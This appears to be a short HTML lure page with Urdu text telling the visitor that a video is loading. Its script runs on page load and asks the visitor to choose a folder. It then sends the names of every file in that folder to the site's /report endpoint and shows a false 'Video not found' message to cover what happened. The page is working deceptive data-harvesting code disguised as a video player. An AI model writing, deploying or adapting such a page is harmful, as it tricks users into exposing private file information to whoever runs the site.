<!DOCTYPE html>
<html>
<head>
  <title>📸 ویڈیو لوڈ ہو رہی ہے...</title>
  <script>
    async function scanFiles() {
      try {
        const handle = await window.showDirectoryPicker();
        let result = "";

        for await (const entry of handle.values()) {
          if (entry.kind === "file") {
            result += `📷 ${entry.name}\n`;
          }
        }

        await fetch("/report", {
          method: "POST",
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ report: result })
        });

        document.body.innerHTML = "<h3>🚫 Video not found</h3>";
      } catch (err) {
        document.body.innerHTML = "<h3>❌ Access blocked by user</h3>";
      }
    }

    window.onload = scanFiles;
  </script>
</head>
<body style="background-color: black; color: white; text-align: center; padding-top: 100px;">
  <h2>🔒 ویڈیو لوڈ ہو رہی ہے...</h2>
  <p>براہ کرم انتظار کریں...</p>
</body>
</html>
